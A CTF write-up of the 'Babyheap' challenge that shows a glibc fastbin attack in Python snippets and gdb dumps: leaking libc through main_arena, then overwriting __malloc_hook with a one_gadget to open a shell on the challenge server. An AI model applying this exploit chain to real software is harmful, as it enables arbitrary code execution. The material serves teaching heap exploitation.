# Babyheap
### Prequisite Knowledge
Get your head around glibc heap implementation: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/ (LIKE THIS IS REALLY IMPORTANT SO READ IT)
Get yourself some juicy source code: https://www.sourceware.org/ml/libc-alpha/2016-08/msg00212.html

I will make the assumption that you have read AND understood the above resources in this writeup. Also note that to save space I will refer directly to the python functions I used to interact with the program (this should be self-explanatory when you see it).

### Understanding The Program - Initial Investigation
Playing around with the binary, we notice that there are 4 functions:
1. Allocate
2. Fill
3. Dump
4. Exit

The first thing I tried was to get an overflow. This was achieved by allocating a chunk and then filling it with a specified size greater than that originally given:
```
p = gdb.debug(binary, 'continue')
allocate(p, 0x10)
fill(p, 0, "A"*0x20)
p.interactive()
```
```
Program received signal SIGINT
pwndbg> vmmap
    ...
    0x55dbaf369000     0x55dbaf38a000 rw-p    21000 0      [heap]
    
pwndbg> x/8gx 0x55dbaf369000
0x55dbaf369000:	0x0000000000000000	0x0000000000000021
0x55dbaf369010:	0x4141414141414141	0x4141414141414141
0x55dbaf369020:	0x4141414141414141	0x4141414141414141
0x55dbaf369030:	0x0000000000000000	0x0000000000000000
```
I then tried to see if there was a trivial use-after-free:
```
allocate(p, 0x10)
fill(p, 0, "A"*0x20)
free(p, 0)
```
Sadly no output was to be seen.

The final experiement I tried was to write null-bytes (was strncpy or read being used?):
```
allocate(p, 0x10)
fill(p, 0, "A\x00\x00A")
```
```
pwndbg> x/6gx 0x555c7ea54000
0x555c7ea54000:	0x0000000000000000	0x0000000000000021
0x555c7ea54010:	0x0000000041000041	0x0000000000000000
0x555c7ea54020:	0x0000000000000000	0x0000000000020fe1
```
Woooh we can write NULL bytes, which might make things easier later xD

### Determining The Aim Of The Game
The glorious resource to get gud at heap exploitation: https://github.com/shellphish/how2heap
How2Heap describes a bunch of techniques for heap exploitation and I couldn't avoid seeing that "2017-babyheap" was next to the technique "abusing the fastbin freelist". Therefore, my next step was looking at fastbin exploitation. The first link I found was: https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627 and it gave a nice example. The exploit worked as follows:
1. Get a libc leak with a use-afer-free vuln.
2. Overwrite the forward pointer of a fast chunk with an address near the GOT via another use-after-free vuln.
3. Overwrite a GOT entry.
4. Profit.

This became the basis for the start of my exploit and was where I got the super good glibc description from (linked in prereq section).

### Getting A Leak
Unfortunately we didn't have a simple use-after-free, i.e. after freeing a small bin sized chunk, we can't trivially dump that same chunk. However, we can use the technique of step 2 (above) to achieve the same goal. From a high level, this is how it is done:
1. Allocate some chunks.
2. Free 2 fast bin chunks so that one points to the other.
3. Overwrite that pointer so it points to a small bin chunk you have allocated.
4. Allocate 2 more chunks that are of fast bin size (this means the second allocation is given a pointer to the same chunk as the small bin).
5. Free the small bin (sets the forward and back pointer to the main_arena).
6. Dump the fast bin chunk that points to the same memory as the small bin.
7. Observe a libc address.

__Steps Broken Down__
1. Allocate 5 chunks:
    - Chunk that we can overflow from.
    - Fast bin chunk to have forward pointer overwritten.
    - Fast bin chunk to prompt a forward pointer existing.
    - Small bin chunk to get the main_arena address.
    - Any chunk to prevent the small bin chunk being merged into the wilderness.
    ```
    allocate(p, 0x10) # 0
    allocate(p, 0x10) # 1
    allocate(p, 0x10) # 2
    allocate(p, 0x80) # 3 - CHUNK WE WANT TO LEAK LIBC FROM
    allocate(p, 0x10) # 4
    ```
2. Free 2 fast bin chunks so that one points to the other:
    ```
    free(p, 2)
    free(p, 1)
    ```
    ```
    pwndbg> x/12gx 0x55f25bf4a000
    0x55f25bf4a000:	0x0000000000000000	0x0000000000000021
    0x55f25bf4a010:	0x0000000000000000	0x0000000000000000
    0x55f25bf4a020:	0x0000000000000000	0x0000000000000021
    0x55f25bf4a030:	0x000055f25bf4a040	0x0000000000000000
    0x55f25bf4a040:	0x0000000000000000	0x0000000000000021
    0x55f25bf4a050:	0x0000000000000000	0x0000000000000000
    ```
3. Overwrite that pointer so it points to a small bin chunk you have allocated:
    ```
    fill(p, 0, ("A"*16)+p64(0x00)+p64(0x21)+"\x60")
    ```
    ```
    pwndbg> x/16gx 0x5575d9d28000
    0x5575d9d28000:	0x0000000000000000	0x0000000000000021
    0x5575d9d28010:	0x4141414141414141	0x4141414141414141
    0x5575d9d28020:	0x0000000000000000	0x0000000000000021
    0x5575d9d28030:	0x00005575d9d28060	0x0000000000000000
    0x5575d9d28040:	0x0000000000000000	0x0000000000000021
    0x5575d9d28050:	0x0000000000000000	0x0000000000000000
    0x5575d9d28060:	0x0000000000000000	0x0000000000000091
    0x5575d9d28070:	0x0000000000000000	0x0000000000000000
    ```
4. Allocate 2 more chunks that are of fast bin size:
    - We must also overwrite the size of small chunk so that it matches that of what the allocation is expecting, otherwise malloc gonna be like "nope".
    - The second allocation will then be given the same pointer as that of the small chunk allocation.
    ```
    allocate(p, 0x10) # 1
    fill(p, 1, ("B"*16)+p64(0x00)+p64(0x21)+("C"*16)+p64(0x00)+p64(0x21))
    allocate(p, 0x10) # 2
    ```
5. Free the small bin (sets the forward and back pointer to the main_arena):
    - Again the size must be adjusted before freeing to that of the small bin.
    - This should place a reference to the main_arena address into the forward and back pointer of the chunk.
    ```
    fill(p, 1, ("B"*16)+p64(0x00)+p64(0x21)+("C"*16)+p64(0x00)+p64(0x91))
    free(p, 3)
    ```
    ```
    0x55e34573c000:	0x0000000000000000	0x0000000000000021
    0x55e34573c010:	0x4141414141414141	0x4141414141414141
    0x55e34573c020:	0x0000000000000000	0x0000000000000021
    0x55e34573c030:	0x4242424242424242	0x4242424242424242
    0x55e34573c040:	0x0000000000000000	0x0000000000000021
    0x55e34573c050:	0x4343434343434343	0x4343434343434343
    0x55e34573c060:	0x0000000000000000	0x0000000000000091
    0x55e34573c070:	0x00007f56186afb78	0x00007f56186afb78
    ```
6. Dump the fast bin chunk that points to the same memory as the small bin:
    ```
    # Forgive my terrible python
    leak_string = dump(p, 2).encode('hex')
    l1 = int(leak_string[8:16], 16)
    l2 = int(leak_string[:8], 16)
    leak = int((p32(l1) + p32(l2)).encode('hex'),16)
    log.info("Leaked address: "+hex(leak))
    ```
7. Observe a libc address:
    - The main arena offset was manually calculated in a debugging session by using a known function address as a reference point (an exercise for the reader):
    ```
    libc = leak - main_arena
    log.info("Libc address: "+hex(libc))
    ```

### Popping Shellz
Unfortunately, we are unable to overwrite a GOT entry due to full RELRO. However, the writeup referenced earlier mentions:
>"If the binary had full RELRO, we can still get around it by overwriting the __malloc_hook function pointer in libc (which is the subject of a future post)."

Naturally, __malloc_hook is as it sounds. From the man pages:
> The GNU C library lets you modify the behavior of malloc(3),  realloc(3),  and  free(3)  by specifying  appropriate hook functions. You can use these hooks to help you debug programs that use dynamic memory allocation, for example.

So any address we write to __malloc_hook will be jumped to whenever malloc gets called. The question then became, where do we want to jump to?
This took  me a long time to figure out, but a really SIMPLE solution exists. [One-gadgets](https://github.com/david942j/one_gadget) are literally addresses you jump to and magically a shell appears. However, certain conditions must be met. Running the linked tool, three potential gadgets were found:
```
$ one_gadget libc-2.24.so-dc6abed98572f9e74390316f9d122aca 
0x3f306	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x3f35a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd695f	execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
```
I was super lazy and just tried them all, rather than checking the conditions manually (it was like 1am at this point so you gotta forgive me). I can tell you that the second one worked :)

The last critical question to answer is how do we overwrite __malloc_hook? We simply use the same trick that was used to leak the main_arena address. However, there is one problem... when we allocate the chunk ontop of __malloc_hook it needs to the right size (max of 0x80 since its a fast bin). However, the __malloc_hook address is not valid!
```
pwndbg> x/2gx &__malloc_hook
0x7f287b471b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
```
But from before, we know we have an overflow and so any valid memory address BEFORE __malloc_hook will do (although overflowing is not necessary in this case):
```
pwndbg> x/16gx &__malloc_hook-14
0x7f287b471aa0 <_IO_wide_data_0+224>:	0x0000000000000000	0x0000000000000000
0x7f287b471ab0 <_IO_wide_data_0+240>:	0x0000000000000000	0x0000000000000000
0x7f287b471ac0 <_IO_wide_data_0+256>:	0x0000000000000000	0x0000000000000000
0x7f287b471ad0 <_IO_wide_data_0+272>:	0x0000000000000000	0x0000000000000000
0x7f287b471ae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
0x7f287b471af0 <_IO_wide_data_0+304>:	0x00007f287b470260	0x0000000000000000
0x7f287b471b00 <__memalign_hook>:	0x00007f287b132e20	0x00007f287b132a00
0x7f287b471b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
```
0x7f is a valid size! So now we know we know we want to allocate a chunk 35 bytes before __malloc_hook, then fill that chunk to overwrite __malloc_hook to our one gadget:
```
allocate(p, 0x10) # 3
allocate(p, 0x60) # 5
allocate(p, 0x60) # 6

free(p, 6)
free(p, 5)

fill(p, 3, ("A"*16)+p64(0x00)+p64(0x71)+p64(libc+fchunk))
allocate(p, 0x60) # 5
allocate(p, 0x60) # 6

fill(p, 6, "A"*(fchunk_offset - 16)+p64(libc+rop))
```
```
pwndbg> x/8gx &__malloc_hook-6
0x7f388c9baae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
0x7f388c9baaf0 <_IO_wide_data_0+304>:	0x00007f388c9b9260	0x4141410000000000
0x7f388c9bab00 <__memalign_hook>:	0x4141414141414141	0x4141414141414141
0x7f388c9bab10 <__malloc_hook>:	0x00007f388c66037a	0x0000000000000000
```
Now, the next time malloc is called, a shell is popped!
```
p.recvuntil(": ")
p.sendline("1\n9447")
p.interactive()
```
```
[+] Opening connection to cysca.redobelisk.com on port 6000: Done
[*] Leaked address: 0x7feff9a07b58
[*] Libc address: 0x7feff966e000
[*] Switching to interactive mode
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command: Size: $ cat flag
FLAG{TRY_IT_FOR_YOURSELF_-_DON'T_COPY_AND_PASTE_FLAG}
```

### Last Note
Hit me up on slack if you want the full exploit script - @papa
